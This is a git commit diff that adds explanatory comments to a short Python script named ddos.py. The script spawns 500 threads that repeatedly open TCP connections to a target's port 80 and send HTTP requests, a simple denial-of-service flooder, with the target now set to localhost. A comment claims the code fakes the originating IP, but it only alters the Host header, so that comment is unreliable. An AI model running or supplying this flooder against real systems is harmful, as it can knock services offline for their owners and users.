b974487b108f1e04890e9a14e3cec2851f0cd089
sreeragpb0 <sreeragpb0@gmail.com>
2022-03-10 13:34:13 +0530

    adding comments

--- DDOS/ddos.py
+++ DDOS/ddos.py
@@ -1,18 +1,27 @@
+#importing the threading module for sumultanious process or threading
 import threading
+#importing the socket module for connection 
 import socket
 
-target = "192.168.0.18"
+#change the target your testing ip
+target = "127.0.0.1"
+#port to perform the attack
 port = 80
+# Faking the originating ip.
 fake_Ip = "192.168.0.220"
 
+#Function to perform the attack.
 def attack():
 	while True:
+#creating socket object.
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#connecting to the target with the socket object.
 		s.connect((target,port))
+#creating http request body.
 		s.sendto(("GET " + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
 		s.sendto(("Host " + fake_Ip + "\r\n\r\n").encode('ascii'), (target, port))
 		s.close()
-		
+#create thread for multi-tasking
 for i in range(500):
 	threads = threading.Thread(target=attack)
 	threads.start()
